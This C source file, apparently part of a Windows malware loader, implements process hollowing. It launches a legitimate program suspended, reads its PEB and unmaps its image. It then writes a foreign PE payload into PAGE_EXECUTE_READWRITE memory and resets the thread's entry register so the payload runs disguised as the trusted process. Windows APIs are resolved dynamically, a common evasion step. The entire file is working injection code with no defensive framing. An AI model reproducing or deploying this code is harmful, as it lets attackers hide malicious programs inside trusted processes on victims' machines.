#include "cyann.h"
#include "api_function.h"

PROCESS_INFORMATION     *create_process(WCHAR *cmd, CINT flag)
{
        CREATEPROCESSW          createproc;
        STARTUPINFO             si;
        LPPROCESS_INFORMATION   pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        if (!(createproc = (CREATEPROCESSW)resolve_symbol(&g_fonctions[0])))
                return (NULL);
	if (!(pi = (LPPROCESS_INFORMATION)malloc(sizeof(PROCESS_INFORMATION))))
		return (NULL);
	ZeroMemory(pi, sizeof(PROCESS_INFORMATION));
	if (!createproc(NULL, cmd, NULL, NULL, FALSE, flag, NULL, NULL, &si, pi))
	{
		free(pi);
                return (NULL);
	}
        return (pi);
}

PEB	*get_remote_peb(HANDLE *rproc)
{
        NTQUERYINFORMATIONPROCESS       getrprocinfo;
        PROCESS_BASIC_INFORMATION       procbasicinfo;
	READPROCESSMEMORY		readprocmem;
        PEB				*rpeb;
	ULONG				retlen;

	rpeb = NULL;
        if (!(getrprocinfo = (NTQUERYINFORMATIONPROCESS)resolve_symbol(&g_fonctions[1])))
                return (NULL);
        if (getrprocinfo(rproc, 0, &procbasicinfo, sizeof(PROCESS_BASIC_INFORMATION), &retlen) != 0)
                return (NULL);
	if (!(readprocmem = (READPROCESSMEMORY)resolve_symbol(&g_fonctions[2])))
		return (NULL);
	if (!(rpeb = (PEB *)malloc(sizeof(PEB))))
		return (NULL);
	if (!readprocmem(rproc, procbasicinfo.PebBaseAddress, rpeb, sizeof(PEB), NULL))
	{
		free(rpeb);
		return (NULL);
	}
        return (rpeb);
}

int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT *newbase)
{	
	LPVOID			hijackRemote;
	LPVOID			virtaddr;
	UNMAPVIEWOFSECTION	unmapview;
	VIRTUALALLOCEX		virtalloc;
	WRITEPROCESSMEM		writeprocmem;

	if (!(unmapview = (UNMAPVIEWOFSECTION)resolve_symbol(&g_fonctions[3])))
		return (0);
	if (unmapview(rpi->hProcess, rpeb->Reserved3[1]) != 0)
                return (0);
	if (!(virtalloc = (VIRTUALALLOCEX)resolve_symbol(&g_fonctions[8])))
                return (0);
	if (!(hijackRemote = virtalloc(rpi->hProcess, /*NULL*/rpeb->Reserved3[1], pe->nthdr.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
                return (0);
	*newbase = (CINT)rpeb->Reserved3[1];
	if (!(writeprocmem = (WRITEPROCESSMEM)resolve_symbol(&g_fonctions[9])))
                return (0);
	if (!writeprocmem(rpi->hProcess, /*hijackRemote*/rpeb->Reserved3[1], pe->buffer, pe->nthdr.OptionalHeader.SizeOfHeaders, NULL))
                return (0);
	for (size_t i = 0; i < pe->nbsect; i++)
	{
		if (pe->secthdr[i].SizeOfRawData)
		{
			virtaddr = /*hijackRemote*/rpeb->Reserved3[1] + pe->secthdr[i].VirtualAddress;
			if (!writeprocmem(rpi->hProcess, virtaddr, pe->sections[i], pe->secthdr[i].SizeOfRawData, NULL))
				return (0);
		}
	}
	return (1);
}

int	set_new_eip(LPPROCESS_INFORMATION rpi, t_pe *pe, CINT newbase)
{
	LPCONTEXT               rcontext;
	GETTHREADCONTEXT        getthcontext;
        SETTHREADCONTEXT        setthcontext;

	if (!(rcontext = (CONTEXT *)malloc(sizeof(CONTEXT))))
		return (0);
	rcontext->ContextFlags = CONTEXT_FULL;
	if (!(getthcontext = (GETTHREADCONTEXT)resolve_symbol(&g_fonctions[10])))
		return (0);
	if (!(setthcontext = (SETTHREADCONTEXT)resolve_symbol(&g_fonctions[11])))
		return (0);
	if (!getthcontext(rpi->hThread, rcontext))
		return (0);
//	rcontext->GPR_BX = (CINT) newbase/*rpeb->Reserved3[1]*/ + pe->nthdr.OptionalHeader.AddressOfEntryPoint;
        rcontext->GPR_AX = (CINT) newbase/*rpeb->Reserved3[1]*/ + pe->nthdr.OptionalHeader.AddressOfEntryPoint;
	if (!setthcontext(rpi->hThread, rcontext))
		return (0);
	free(rcontext);
	return (1);
}

int     process_hollow(WCHAR *legitproc, t_pe *pe)
{
	CINT			newbase;
	PEB			*remotepeb;
	LPPROCESS_INFORMATION   pi;

	remotepeb = NULL;
	pi = NULL;
	if (!(pi = create_process(legitproc, CREATE_SUSPENDED)))
		return (0);
	if ((remotepeb = get_remote_peb(pi->hProcess)))
	{
		if (hijack_legit(pi, remotepeb, pe, &newbase))
		{
			if (set_new_eip(pi, pe, newbase))
			{
				debug_son(pi, (CINT)newbase/*remotepeb->Reserved3[1]*/);
				free(pi);
				free(remotepeb);
				return (1);
			}
		}
	}
	free(remotepeb);
	free(pi);
	return (0);
}
